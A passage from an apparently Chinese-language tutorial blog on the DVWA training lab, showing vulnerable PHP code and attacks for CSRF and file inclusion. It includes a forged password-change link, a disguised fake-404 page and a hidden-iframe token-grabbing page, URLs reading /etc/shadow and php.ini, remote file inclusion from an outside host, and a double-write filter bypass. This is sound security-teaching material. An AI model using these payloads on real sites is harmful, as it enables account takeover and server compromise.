'</span>&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;<span class="string">'; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#125; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Generate Anti-CSRF token </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">generateSessionToken(); </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="审计-7"><a href="#审计-7" class="headerlink" title="审计"></a>审计</h4><p>Impossible级别的代码加入了Anti-CSRF token，同时对参数ip进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。</p>
<h2 id="CSRF-Cross-site-request-forgery"><a href="#CSRF-Cross-site-request-forgery" class="headerlink" title="CSRF(Cross-site request forgery)"></a>CSRF(Cross-site request forgery)</h2><p>CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用<br><img src="csrf01.png" alt=""></p>
<h3 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_GET</span>[ <span class="string">'Change'</span> ] ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">'password_new'</span> ]; </span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">    // Do the passwords match? </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123; </span><br><span class="line">        // They <span class="keyword">do</span>! </span><br><span class="line">        <span class="variable">$pass_new</span> = mysql_real_escape_string( <span class="variable">$pass_new</span> ); </span><br><span class="line">        <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> ); </span><br><span class="line"></span><br><span class="line">        // Update the database </span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">"UPDATE `users` SET password = '<span class="variable">$pass_new</span>' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>; </span><br><span class="line">        <span class="variable">$result</span> = mysql_query( <span class="variable">$insert</span> ) or die( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">        // Feedback <span class="keyword">for</span> the user </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        // Issue with passwords matching </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="审计-8"><a href="#审计-8" class="headerlink" title="审计"></a>审计</h4><p>可以看到的是直接对比检查参数password_new与password_conf是否一致，如果一致就直接修改代码</p>
<h4 id="漏洞利用-6"><a href="#漏洞利用-6" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul>
<li>构造链接<blockquote>
<p><a href="http://dvwa.com/DVWA/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#" target="_blank" rel="noopener">http://dvwa.com/DVWA/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</a></p>
</blockquote>
</li>
</ul>
<p>当受害者点击了这个链接之后，就会更改密码，当然，一般都是需要你登陆之后的，这里面有体现，但是大家会有疑问，这个链接太直白了，懂一点的人就直接不会点了呀。</p>
<ul>
<li>使用短链接来隐藏url<br>可以使用百度短网址，将地址缩短进行伪装</li>
</ul>
<p>上述两种方法都可以在同个浏览器访问已经同个网站的时候才可以生效，但是受害者最终还是能看到密码修改成功的页面，所以还需要进一步伪装</p>
<ul>
<li>构造钓鱼页面<br>在公网服务器上上传一个攻击页面，诱骗受害者去访问，并且不做任何跳转，如下的简单的页面</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"http://dvwa.com/DVWA/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#"</span>/&gt; </span><br><span class="line">&lt;h1&gt;404&lt;/h1&gt;</span><br><span class="line">&lt;h2&gt;file not found.&lt;/h2&gt;</span><br></pre></td></tr></table></figure>
<h3 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Checks to see where the request came from </span></span><br><span class="line">    <span class="keyword">if</span>( eregi( $_SERVER[ <span class="string">'SERVER_NAME'</span> ], $_SERVER[ <span class="string">'HTTP_REFERER'</span> ] ) ) &#123; </span><br><span class="line">        <span class="comment">// Get input </span></span><br><span class="line">        $pass_new  = $_GET[ <span class="string">'password_new'</span> ]; </span><br><span class="line">        $pass_conf = $_GET[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords match? </span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">            <span class="comment">// They do! </span></span><br><span class="line">            $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">            $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update the database </span></span><br><span class="line">            $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>; </span><br><span class="line">            $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// Issue with passwords matching </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Didn't come from a trusted source </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line"><span class="comment">#### 代码审计</span></span><br><span class="line"></span><br><span class="line">int eregi(string pattern, string string)</span><br><span class="line">检查string中是否含有pattern（不区分大小写），如果有返回<span class="keyword">True</span>，反之<span class="keyword">False</span></span><br><span class="line">Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是<span class="number">192.168</span><span class="number">.153</span><span class="number">.130</span>），希望通过这种机制抵御CSRF攻击</span><br><span class="line"></span><br><span class="line"><span class="comment">#### 漏洞利用</span></span><br><span class="line"></span><br><span class="line">过滤规则是http包头的Referer参数的值中必须包含主机名（这里是<span class="number">192.168</span><span class="number">.242</span><span class="number">.132</span>）</span><br><span class="line">直接将上一等级的页面名字改为<span class="number">192.168</span><span class="number">.242</span><span class="number">.132</span>就可以了</span><br><span class="line"></span><br><span class="line"><span class="comment">### High</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">``` bash</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span> </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123; </span><br><span class="line">        <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">        checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line">    </span><br><span class="line">        <span class="comment">// Get input </span></span><br><span class="line">        $pass_new  = $_GET[ <span class="string">'password_new'</span> ]; </span><br><span class="line">        $pass_conf = $_GET[ <span class="string">'password_conf'</span> ]; </span><br><span class="line">    </span><br><span class="line">        <span class="comment">// Do the passwords match? </span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">            <span class="comment">// They do! </span></span><br><span class="line">            $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">            $pass_new = md5( $pass_new ); </span><br><span class="line">    </span><br><span class="line">            <span class="comment">// Update the database </span></span><br><span class="line">            $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>; </span><br><span class="line">            $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line">    </span><br><span class="line">            <span class="comment">// Feedback for the user </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// Issue with passwords matching </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    </span><br><span class="line">        mysql_close(); </span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">    generateSessionToken(); </span><br><span class="line">    </span><br><span class="line">    <span class="meta">?&gt;</span> </span><br><span class="line">```    </span><br><span class="line"></span><br><span class="line"><span class="comment">#### 代码审计</span></span><br><span class="line"></span><br><span class="line">High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</span><br><span class="line"></span><br><span class="line"><span class="comment">#### 漏洞利用</span></span><br><span class="line">要绕过High级别的反CSRF机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token。</span><br><span class="line">试着去构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击，下面是代码。</span><br><span class="line"></span><br><span class="line">``` bash</span><br><span class="line">    &lt;!DOCTYPE html&gt;</span><br><span class="line">    &lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">        &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">        &lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">csrfAttack</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                document.getElementsByName(<span class="string">'user_token'</span>)[<span class="number">0</span>].value=document.getElementById(<span class="string">"tokenwindow"</span>).contentWindow.document.getElementsByName(<span class="string">'user_token'</span>)[<span class="number">0</span>].value;</span><br><span class="line">                document.getElementsById(<span class="string">"submitform"</span>).submit();</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body onload=<span class="string">"csrfAttack()"</span>&gt;</span><br><span class="line">    &lt;iframe src=<span class="string">"http://dvwa.com/DVWA/vulnerabilities/csrf/"</span> id=<span class="string">"tokenwindow"</span> frameborder=<span class="string">"0"</span> style=<span class="string">"display: none"</span>&gt;&lt;/iframe&gt;</span><br><span class="line">    &lt;form action=<span class="string">"http://dvwa.com/DVWA/vulnerabilities/csrf/"</span> method=<span class="string">"get"</span> id=<span class="string">"submitform"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"password_new"</span> value=<span class="string">"password"</span>&gt;</span><br><span class="line">    </span><br><span class="line">        &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"password_conf"</span> value=<span class="string">"password"</span>&gt;</span><br><span class="line">    </span><br><span class="line">        &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"user_token"</span> value=<span class="string">""</span>&gt;</span><br><span class="line">    </span><br><span class="line">        &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"Change"</span> value=<span class="string">"Change"</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">    &lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>将上述页面放置在攻击者服务器里面，让受害者点击完成CSRF攻击。代码思路是通过隐藏的iframe加载访问修改密码的页面，获取页面中的token，并像服务器发送改密码请求。</p>
<p>但是浏览有自带的防范机制，不准跨域，攻击者服务器域名下不允许获取被攻击服务器的页面内容。因此上述代码只是理论上能实现，因此我们需要将攻击代码注入到被攻击者服务器上，才有可能完成攻击。<br>等学习到了XSS注入再更</p>
<h3 id="Impossible-2"><a href="#Impossible-2" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">    &lt;?php </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( isset( <span class="variable">$_GET</span>[ <span class="string">'Change'</span> ] ) ) &#123; </span><br><span class="line">        // Check Anti-CSRF token </span><br><span class="line">        checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">'user_token'</span> ], <span class="variable">$_SESSION</span>[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line">    </span><br><span class="line">        // Get input </span><br><span class="line">        <span class="variable">$pass_curr</span> = <span class="variable">$_GET</span>[ <span class="string">'password_current'</span> ]; </span><br><span class="line">        <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">'password_new'</span> ]; </span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">'password_conf'</span> ]; </span><br><span class="line">    </span><br><span class="line">        // Sanitise current password input </span><br><span class="line">        <span class="variable">$pass_curr</span> = stripslashes( <span class="variable">$pass_curr</span> ); </span><br><span class="line">        <span class="variable">$pass_curr</span> = mysql_real_escape_string( <span class="variable">$pass_curr</span> ); </span><br><span class="line">        <span class="variable">$pass_curr</span> = md5( <span class="variable">$pass_curr</span> ); </span><br><span class="line">    </span><br><span class="line">        // Check that the current password is correct </span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> ); </span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">':user'</span>, dvwaCurrentUser(), PDO::PARAM_STR ); </span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">':password'</span>, <span class="variable">$pass_curr</span>, PDO::PARAM_STR ); </span><br><span class="line">        <span class="variable">$data</span>-&gt;execute(); </span><br><span class="line">    </span><br><span class="line">        // Do both new passwords match and does the current password match the user? </span><br><span class="line">        <span class="keyword">if</span>( ( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &amp;&amp; ( <span class="variable">$data</span>-&gt;rowCount() == 1 ) ) &#123; </span><br><span class="line">            // It does! </span><br><span class="line">            <span class="variable">$pass_new</span> = stripslashes( <span class="variable">$pass_new</span> ); </span><br><span class="line">            <span class="variable">$pass_new</span> = mysql_real_escape_string( <span class="variable">$pass_new</span> ); </span><br><span class="line">            <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> ); </span><br><span class="line">    </span><br><span class="line">            // Update database with new password </span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">'UPDATE users SET password = (:password) WHERE user = (:user);'</span> ); </span><br><span class="line">            <span class="variable">$data</span>-&gt;bindParam( <span class="string">':password'</span>, <span class="variable">$pass_new</span>, PDO::PARAM_STR ); </span><br><span class="line">            <span class="variable">$data</span>-&gt;bindParam( <span class="string">':user'</span>, dvwaCurrentUser(), PDO::PARAM_STR ); </span><br><span class="line">            <span class="variable">$data</span>-&gt;execute(); </span><br><span class="line">    </span><br><span class="line">            // Feedback <span class="keyword">for</span> the user </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            // Issue with passwords matching </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    // Generate Anti-CSRF token </span><br><span class="line">    generateSessionToken(); </span><br><span class="line">    </span><br><span class="line">    ?&gt; </span><br><span class="line">```    </span><br><span class="line"><span class="comment">#### 审计</span></span><br><span class="line">利用PDO技术防御SQL注入，使用token以及输入原始密码防护CSRF,攻击者不知道密码，无论如何都无法进行CSRF攻击</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## File Inclusion</span></span><br><span class="line"></span><br><span class="line">File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了</span><br><span class="line">![](fileinclue01.png)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Low</span></span><br><span class="line"></span><br><span class="line">``` bash</span><br><span class="line">    &lt;php</span><br><span class="line">    //Thepagewewishtodisplay</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">'page'</span>];</span><br><span class="line">    &gt;</span><br></pre></td></tr></table></figure>
<h4 id="审计-9"><a href="#审计-9" class="headerlink" title="审计"></a>审计</h4><p>page参数没有做任何的过滤跟检查,接受什么参数就包含相应的文件，并将结果返回。</p>
<h4 id="漏洞利用-7"><a href="#漏洞利用-7" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul>
<li>本地文件包含<blockquote>
<p><a href="http://dvwa.com/DVWA/vulnerabilities/fi/?page=/etc/shadow" target="_blank" rel="noopener">http://dvwa.com/DVWA/vulnerabilities/fi/?page=/etc/shadow</a></p>
</blockquote>
</li>
</ul>
<p><img src="fileinclude02.png" alt=""></p>
<p>显示报错，并且从报错可以知道服务器文件的绝对路径C:\xampp\htdocs\</p>
<p>因此我们再构造url</p>
<blockquote>
<p><a href="http://dvwa.com/DVWA/vulnerabilities/fi/?page=C:/xampp/htdocs/DVWA/php.ini" target="_blank" rel="noopener">http://dvwa.com/DVWA/vulnerabilities/fi/?page=C:/xampp/htdocs/DVWA/php.ini</a></p>
</blockquote>
<p>成功读取了服务器的php.ini文件</p>
<p><img src="fileinclusion03.png" alt=""></p>
<ul>
<li>远程文件包含</li>
</ul>
<p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p>
<p>我们在攻击者服务器上上传一个phpinfo.txt,代码简单如下所示:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    phpinfo();</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
<p>然后访问：</p>
<blockquote>
<p><a href="http://dvwa.com/DVWA/vulnerabilities/fi/?page=http://5kcrm.com/phpinfo.txt" target="_blank" rel="noopener">http://dvwa.com/DVWA/vulnerabilities/fi/?page=http://5kcrm.com/phpinfo.txt</a></p>
</blockquote>
<p>同样也可以执行成功</p>
<h3 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">    &lt;php</span><br><span class="line">    </span><br><span class="line">    //Thepagewewishtodisplay</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">'page'</span>];</span><br><span class="line">    </span><br><span class="line">    //Inputvalidation</span><br><span class="line">    <span class="variable">$file</span>=str_replace(array(<span class="string">"http://"</span>,<span class="string">"https://"</span>),<span class="string">""</span>,<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span>=str_replace(array(<span class="string">"../"</span>,<span class="string">"..\""</span>),<span class="string">""</span>,<span class="variable">$file</span>);、</span><br><span class="line">```    </span><br><span class="line"><span class="comment">#### 审计</span></span><br><span class="line">增加了str_replace函数，对page参数进行了一定的处理，将”http:// ”、”https://”、 ” ../”、”..\”替换为空字符，即删除。</span><br><span class="line"></span><br><span class="line"><span class="comment">#### 漏洞利用</span></span><br><span class="line"></span><br><span class="line">str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。</span><br><span class="line">比如Low级别的代码:</span><br><span class="line"></span><br><span class="line">&gt;http://dvwa.com/DVWA/vulnerabilities/<span class="keyword">fi</span>/?page=http://5kcrm.com/phpinfo.txt</span><br><span class="line"></span><br><span class="line">我们可以写成这样绕过</span><br><span class="line">&gt;http://dvwa.com/DVWA/vulnerabilities/<span class="keyword">fi</span>/?page=hthttp://tp://5kcrm.com/phpinfo.txt</span><br><span class="line"></span><br><span class="line">同时，因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。</span><br><span class="line"></span><br><span class="line">- 本地文件包含</span><br><span class="line"></span><br><span class="line">&gt;http://dvwa.com/DVWA/vulnerabilities/<span class="keyword">fi</span>/?page=…/./…/./…/./…/./…/./…/./…/./…/./…/./…/./xampp/htdocs/dvwa/php.ini</span><br><span class="line"></span><br><span class="line">&gt;&gt;http://dvwa.com/DVWA/vulnerabilities/<span class="keyword">fi</span>/?page=C:/xampp/htdocs/dvwa/php.ini</span><br><span class="line"></span><br><span class="line">- 远程文件</span><br><span class="line"></span><br><span class="line">&gt;http://dvwa.com/DVWA/vulnerabilities/<span class="keyword">fi</span>/?page=hthttp://tp://5kcrm.com/phpinfo.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">### High</span></span><br><span class="line"></span><br><span class="line">``` bash</span><br><span class="line">    &lt;php</span><br><span class="line">    </span><br><span class="line">    //Thepagewewishtodisplay</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span 